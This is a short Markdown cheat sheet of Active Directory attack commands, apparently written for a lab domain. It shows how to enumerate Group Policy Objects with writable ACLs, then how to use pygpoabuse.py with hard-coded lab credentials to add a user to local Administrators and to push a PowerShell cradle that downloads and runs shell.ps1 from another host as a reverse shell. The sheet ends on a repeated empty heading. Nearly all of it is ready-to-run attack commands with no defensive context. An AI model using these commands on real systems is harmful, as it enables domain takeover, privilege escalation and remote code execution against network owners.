# Search Domain GPOs
```powershell
Get-DomainGPO | Get-DomainObjectAcl | Where-Object {
    $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" 
}
```

# Search OU with GPO Link
```powershell
Get-DomainGPO -Identity "GPO-NAME" | Select-Object -ExpandProperty gpolink
```

# GPO Manipulation 1 ( Add Local Administrator )
```powershell
python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-name "GPO_ADINIZ" -command "net localgroup Administrators ShadowOperator /add" -dc-ip 192.168.1.10

python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command "net localgroup Administrators ShadowOperator /add" -dc-ip 192.168.1.10
```

# GPO Manipulation 2 ( Reverse Shell )
```powershell
python3 pygpoabuse.py 'warzone.oxsium.local/ShadowOperator:Oxsium_Lab123!' -gpo-name "GPO_ADINIZ" -powershell -command "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5/shell.ps1')" -dc-ip 192.168.1.10
```

# GPO Manipulation 2 ( Reverse Shell )
